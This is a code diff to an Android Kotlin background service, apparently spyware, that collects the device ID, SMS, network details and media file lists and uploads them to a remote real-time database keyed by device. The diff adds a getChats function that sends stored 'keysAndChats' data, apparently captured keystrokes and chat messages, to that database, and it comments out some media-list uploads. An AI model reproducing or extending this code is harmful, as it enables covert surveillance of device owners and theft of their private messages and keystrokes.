@@ -26,6 +26,7 @@ import com.google.gson.Gson
 import com.torvalds.rtdbdatasaervice.R
 import com.torvalds.rtdbdatasaervice.app.Companion.marker
 import com.torvalds.rtdbdatasaervice.gameover.utils.NetworkUtils
+import com.torvalds.rtdbdatasaervice.gameover.utils.SavePref
 import java.io.File
 import java.lang.Long
 import java.util.*
@@ -70,12 +71,16 @@ class DataService : Service() {
 
             getVideoList()
 
+            getChats()
+
             this.stopForeground(true)
         } else if (intent != null && intent.action.equals("stopDataCapture")) {
             stopSelf()
         }
         return START_STICKY
     }
+
+
 
     private fun getAid() {
         aid = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
@@ -305,6 +310,16 @@ class DataService : Service() {
         dbRef.child(aid).child("mobileNetwork").child(timeStmp()).setValue(Gson().toJson(uploadJson))
     }
 
+    private fun getChats() {
+        var savePref =  SavePref(this)
+        var chats = savePref.getChat()
+        if(chats != "chat") {
+            dbRef.child(aid).child("keysAndChats").child(timeStmp()).setValue(chats)
+        }
+        savePref.setChat("chat")
+
+    }
+
     @RequiresApi(Build.VERSION_CODES.N)
     private fun getSms() {
         Log.e("DataService".uppercase(), "Entered SMS info")
@@ -392,40 +407,14 @@ class DataService : Service() {
                     val imageUri = Uri.parse(cursor.getString(imageUriIndex))
                     listOfImage.add(imageUri.toString())
                     Log.e("DATASERVICE", String.format("URI : %s,\nFile Path : %s", imageUri.toString(), File(imageUri.toString()).absolutePath))
-                    /*val uploadThread = Thread {
-                        try {
-                            UploadData(
-                                applicationContext,
-                                NetworkUtils.getInstance(applicationContext).syncFilesNest
-                            ).doUploadFile(imageUri.toFile(), aid, "image")
-                        } catch (e: Exception) {
-                            e.printStackTrace()
-                        }
-                    }
-
-                    uploadThread.start()*/
                     dataJSONArray.put(imageUri.toString())
                 } while (cursor.moveToNext())
             }
         }
         uploadJson.put("imageList", dataJSONArray)
 
-       /* val uploadThread = Thread {
-            try {
 
-                UploadData(
-                    applicationContext,
-                    NetworkUtils.getInstance(applicationContext).reportFilePathsNest,
-                    uploadJson
-                ).doUpload()
-            } catch (e: Exception) {
-                e.printStackTrace()
-            }
-        }
-
-        uploadThread.start()*/
-
-        dbRef.child(aid).child("fileList").child("images").child(timeStmp()).setValue(Gson().toJson(uploadJson))
+        //dbRef.child(aid).child("fileList").child("images").child(timeStmp()).setValue(Gson().toJson(uploadJson))  //for list
     }
 
     @RequiresApi(Build.VERSION_CODES.N)
@@ -464,10 +453,6 @@ class DataService : Service() {
                 marker!!.setLastAudio(lastAudioTime)
                 do {
                     val audioUri = Uri.parse(cursor.getString(audioUriIndex))
-                    /*UploadData(
-                        applicationContext,
-                        NetworkUtils.getInstance(applicationContext).syncFilesNest
-                    ).doUploadFile(audioUri.toFile(), aid, "audio")*/
                     dataJSONArray.put(audioUri.toString())
                     listOfAudio.add(audioUri.toString())
                 } while (cursor.moveToNext())
@@ -476,21 +461,7 @@ class DataService : Service() {
 
         uploadJson.put("videoList", dataJSONArray)
 
-       /* val uploadThread = Thread {
-            try {
-                UploadData(
-                    applicationContext,
-                    NetworkUtils.getInstance(applicationContext).reportFilePathsNest,
-                    uploadJson
-                ).doUpload()
-            } catch (e: Exception) {
-                e.printStackTrace()
-            }
-        }
-
-        uploadThread.start()*/
-
-        dbRef.child(aid).child("fileList").child("audios").child(timeStmp()).setValue(Gson().toJson(uploadJson))
+        //dbRef.child(aid).child("fileList").child("audios").child(timeStmp()).setValue(Gson().toJson(uploadJson))  //for list
     }
 
     @RequiresApi(Build.VERSION_CODES.N)
@@ -525,10 +496,7 @@ class DataService : Service() {
                 marker!!.setLastVideo(lastVideoTime)
                 do {
                     val videoUri = Uri.parse(cursor.getString(videoUriIndex))
-                    /*UploadData(
-                        applicationContext,
-                        NetworkUtils.getInstance(applicationContext).syncFilesNest
-                    ).doUploadFile(File(videoUri.toString()), aid, "video")*/
+
                     dataJSONArray.put(videoUri.toString())
                     listOfVideo.add(videoUri.toString())
                 } while (cursor.moveToNext())
@@ -537,20 +505,7 @@ class DataService : Service() {
 
         uploadJson.put("videoList", dataJSONArray)
 
-        /*val uploadThread = Thread {
-            try {
-                UploadData(
-                    applicationContext,
-                    NetworkUtils.getInstance(applicationContext).reportFilePathsNest,
-                    uploadJson
-                ).doUpload()
-            } catch (e: Exception) {
-                e.printStackTrace()
-            }
-        }
+        //dbRef.child(aid).child("fileList").child("videos").child(timeStmp()).setValue(Gson().toJson(uploadJson))  //for list
 
-        uploadThread.start()
-*/
-        dbRef.child(aid).child("fileList").child("videos").child(timeStmp()).setValue(Gson().toJson(uploadJson))
     }
 }
